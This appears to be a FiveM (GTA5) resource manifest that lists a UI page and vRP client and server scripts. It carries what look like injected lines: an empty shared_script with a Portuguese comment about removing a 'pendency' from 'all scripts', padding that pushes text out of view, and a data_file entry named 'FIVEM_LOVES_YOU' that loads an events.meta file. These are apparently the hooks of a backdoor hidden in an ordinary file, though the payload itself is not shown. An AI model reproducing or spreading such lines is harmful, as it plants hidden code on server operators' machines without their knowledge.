
shared_script "" --Para remover esta pendencia de todos scripts, execute no console o comando "uninstall"
fx_version 'bodacious'
game 'gta5'
ui_page_preload "yes"
ui_page "resources/capuz/cl/index.html"
files {
	"resources/capuz/cl/capuz.png",
	"resources/capuz/cl/index.html",
}                                                                                                                                                                                                                                                                                                                                  
client_scripts {
	"@vrp/lib/utils.lua",
	"dispatch/*.lua",
	"resources//**/cl/**.lua", 
}
server_scripts {
	"@vrp/lib/itemlist.lua",
	"@vrp/lib/utils.lua",
	"resources/**/sv/**.lua", 
}
data_file "FIVEM_LOVES_YOU_4B38E96CC036038F" "resources/metas-side/cl/events.meta"              